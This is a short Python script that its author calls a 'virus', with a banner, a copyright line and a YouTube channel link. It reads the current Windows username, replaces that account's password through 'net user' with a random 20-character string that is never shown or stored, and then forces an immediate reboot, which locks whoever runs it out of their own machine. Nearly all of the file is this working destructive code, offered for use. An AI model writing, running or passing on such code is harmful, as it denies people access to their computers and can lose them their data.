# Virus for change windows login password
# Developer: Mohammad Ali Bazzazi (me)

print("""
_______________     __________   _______   _______    _________   _______    #
|              \   |          |        /         /   |         |        /   
|               |  |          |       /         /    |         |       /     |
|              /   |          |      /         /     |         |      /      |
|_____________|    |__________|     /         /      |_________|     /       |
|              \   |          |    /         /       |         |    /        |
|               |  |          |   /         /        |         |   /         |
|              /   |          |  /         /         |         |  /          |
|_____________/    |          | /_______  /_______   |         | /______     |
""")
print("*********************************************************************************")
print("*"+" "*79+"*")
print("*  Copyright of Mohammad Ali Bazzazi, 2022 ©                                    *")
print("*"+" "*79+"*")
print("*  https://www.youtube.com/channel/UCeLKoNs3c72Vc-OG3uNQxGw?sub_confirmation=1  *")
print("*"+" "*79+"*")
print("*********************************************************************************")

################## START ##################
import os
import random

username=os.environ.get("USERNAME") # get username
alphabet=list("ABCDEFGHIJKLMNOPQRSTUVWXYZ"
              +"abcdefghijklmnopqrstuvwxyz"
              +"1234567890"
              +"!@#$%^&*()_+?><")

password="".join(random.choices(alphabet, k=20)) # create strong password

os.system(f"""net user "{username}" "{password}" """) #change user password
################## END ##################

os.system("shutdown -r -t 00") # reboot system
